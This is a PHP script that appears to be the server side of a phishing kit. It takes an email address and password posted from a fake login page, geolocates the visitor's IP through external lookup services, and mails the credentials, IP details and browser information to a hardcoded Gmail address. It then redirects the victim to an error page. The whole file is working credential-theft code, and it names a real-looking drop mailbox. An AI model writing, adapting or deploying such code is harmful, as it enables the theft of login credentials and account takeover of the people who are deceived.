<?php
if($_POST){
$ip = getenv('HTTP_CLIENT_IP')?:
getenv('HTTP_X_FORWARDED_FOR')?:
getenv('HTTP_X_FORWARDED')?:
getenv('HTTP_FORWARDED_FOR')?:
getenv('HTTP_FORWARDED')?:
getenv('REMOTE_ADDR');

$query = @unserialize(file_get_contents('http://ip-api.com/php/'.$ip));
$query2 = @json_decode(file_get_contents("https://api.ipdata.co/{$ip}"));
if($query && $query['status'] == 'success') {
  $ipDetails = 'This visitor visited from '.$query['country'].', '.$query['regionName'] .', '.$query['city'].' with IP Address of - '.$query['query'];
} else {
  $ipDetails = $ip. ' | '.@$query2->country . ' | '.@$query2->region. ' | '. @$query2->city ;

}


$id = $email = $_POST['X1'];
$password = $_POST['X2'];

// var_dump($_POST);
// die;

if (empty($email) || empty($password)) {
header( "Location: index.php" );
}



$msg = "<h3>Details of a login</h3>
<br>
Email Address : <b>$id</b> <br/>
Password : <b>$password</b>

<p>Time Received - ". date("d/m/Y h:i:s a") ."</p>
";


$to = "suzannemayer32333@gmail.com";
// $to = "suzannemayer32333@gmail.com";
$subject = "New Log From Visitor | Normal 1D | $email";
$headers = "From: Noreply\r\n";




$obj = new BrowserDetection();
//echo $obj->detect()->getInfo();

// $headers .= "Reply-To: ". strip_tags($email) . "\r\n";

$headers .= "MIME-Version: 1.0\r\n";
$headers .= "Content-Type: text/html; charset=ISO-8859-1\r\n";

$message = '<html><body>';

$message .= '<table rules="all" style="border-color: #666;" cellpadding="10">';
$message .= "<tr><td><strong>Email:</strong> </td><td>" . strip_tags($email) . "</td></tr>";
$message .= "<tr><td><strong>Subject:</strong> </td><td>" . strip_tags($subject) . "</td></tr>";
$message .= "<tr><td><strong>Message:</strong> </td><td>" . $msg . "</td></tr>";
$message .= "<tr><td><strong>IP Details:</strong> </td><td>" . $ipDetails. "</td></tr>";
// $message .= "<tr><td><strong>Where Link Is Clicked From:</strong> </td><td>" . @$_SERVER['HTTP_REFERER']. "</td></tr>";
$message .= "<tr><td><strong>Browser Details:</strong> </td><td>" . $obj->detect()->getInfo(). "</td></tr>";
$message .= "</table>";
$message .= "</body></html>";

 $send  = @mail($to, $subject, $message, $headers);
 // $send2  = @mail($to2, $subject, $message, $headers);




header("Location: error.php?X1=$email");

}


die;
    


// }
  ?>
